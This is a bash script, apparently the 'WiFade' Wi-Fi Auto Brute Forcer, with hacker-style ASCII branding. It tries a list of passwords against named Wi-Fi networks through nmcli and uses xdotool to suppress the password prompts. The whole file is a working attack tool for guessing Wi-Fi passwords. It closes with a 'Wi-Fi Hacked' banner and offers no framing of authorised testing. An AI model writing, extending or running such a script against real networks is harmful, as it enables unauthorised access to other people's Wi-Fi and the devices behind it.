#!/bin/bash

# ASCII Art for WiFade
echo -e "\n\n\e[31m
\t\t ‚ñà     ‚ñà‚ñë ‚ñà‚ñà‚ñì  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñÑ‚ñÑ‚ñÑ      ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà 
\t\t‚ñì‚ñà‚ñë ‚ñà ‚ñë‚ñà‚ñë‚ñì‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà   ‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñí‚ñà‚ñà‚ñÄ ‚ñà‚ñà‚ñå‚ñì‚ñà   ‚ñÄ 
\t\t‚ñí‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñí‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà ‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñë‚ñà‚ñà   ‚ñà‚ñå‚ñí‚ñà‚ñà‚ñà   
\t\t‚ñë‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñë‚ñà‚ñà‚ñë‚ñë‚ñì‚ñà‚ñí  ‚ñë‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñë‚ñì‚ñà‚ñÑ   ‚ñå‚ñí‚ñì‚ñà  ‚ñÑ 
\t\t‚ñë‚ñë‚ñà‚ñà‚ñí‚ñà‚ñà‚ñì ‚ñë‚ñà‚ñà‚ñë‚ñë‚ñí‚ñà‚ñë    ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí
\t\t‚ñë ‚ñì‚ñë‚ñí ‚ñí  ‚ñë‚ñì   ‚ñí ‚ñë    ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë ‚ñí‚ñí‚ñì  ‚ñí ‚ñë‚ñë ‚ñí‚ñë ‚ñë
\t\t  ‚ñí ‚ñë ‚ñë   ‚ñí ‚ñë ‚ñë       ‚ñí   ‚ñí‚ñí ‚ñë ‚ñë ‚ñí  ‚ñí  ‚ñë ‚ñë  ‚ñë
\t\t  ‚ñë   ‚ñë   ‚ñí ‚ñë ‚ñë ‚ñë     ‚ñë   ‚ñí    ‚ñë ‚ñë  ‚ñë    ‚ñë   
\t\t    ‚ñë     ‚ñë               ‚ñë  ‚ñë   ‚ñë       ‚ñë  ‚ñë
\t\t                               ‚ñë        
"
echo -e "\e[31m============\e[32mWi-Fi Auto Brute Forcer\e[31m============\e[0m"
echo -e " \e[31mTool: \e[0mWifade \e[31mlinux-v1.0\e[0m"
echo -e " \e[31mAuthor:\e[0m Faded"
echo -e " \e[31mGitHub:\e[0m https://github.com/anonfaded/wifade"
echo -e " \e[31mCyber Network:\e[0m üè¥ https://linktr.ee/fadedhood üè¥"
echo -e " \e[31mUsage:\e[0m 
  \e[35mConfigure the tool before using, 
  check the README file at GitHub for all details.\e[0m "
echo -e "\e[31m===============================================\e[0m"


# List of Wi-Fi SSIDs to try

SSIDS=("Anonymous") # replace the 'Anonymous' with your hotspot/wifi name (by default script will search for WiFi "Anonymous").
# To use this tool with multiple Wi-Fi networks, add the SSID names to the SSIDS array above. For example: SSIDS=("Anonymous" "Second WiFi" "Third WiFi") and all of them will be brute forced with the passwords that we specify below.


# List of passwords to try
PASSWORDS=("secret" "p4ssw0rd" "12345678" "admin") ## Add the passwords in double quotes you want to use for brute forcing. This is version 1.0, so there's no option to use a password dictionary yet, but it may be included in future versions.

# Check current connection status
function check_already_connected() {
    local ssid=$1
    local current_ssid=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2)
    if [[ "$current_ssid" == "$ssid" ]]; then
        echo -e "\t \e[35m<<< Already connected to \e[35m$ssid >>>\e[0m"
        return 0 # 0 = true in bash script
    else
        return 1 # 1 = false in bash script
    fi
}

# Loop through each SSID
for SSID in "${SSIDS[@]}"; do
    echo -e "\n\t \e[34mAttempting to connect to\e[35m $SSID\n \e[0m"
    if check_already_connected "$SSID"; then
        continue # Skip to the next SSID if already connected
    fi
    # Loop through each password
    for PASSWORD in "${PASSWORDS[@]}"; do
        # Attempt to connect
        echo -e "  üîé Trying password \e[35m$PASSWORD\e[0m"
        nmcli dev wifi connect "$SSID" password "$PASSWORD" & PID=$!
        sleep 1 # Wait a short period to ensure the dialog has time to appear

        # Keep sending Escape key every 2 seconds until the nmcli command finishes
        while kill -0 $PID 2>/dev/null; do
            xdotool key Escape
            sleep 2
        done
        
        # Check if connected
        CURRENT_SSID=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2)
        if [ "$CURRENT_SSID" == "$SSID" ]; then
            echo -e "\n\e[32m\tüéâ Success: Connected to $SSID with password \e[35m$PASSWORD\n\e[0m"
            break 2 # Exit both loops
        else
            echo -e "\e[31m\tüö´ Failed to connect to $SSID with password \e[35m$PASSWORD\n\e[0m"
        fi
    done
done

echo -e "\e[32m\n\t\t\tüíÄ Wi-Fi HackedüíÄ\n\n"

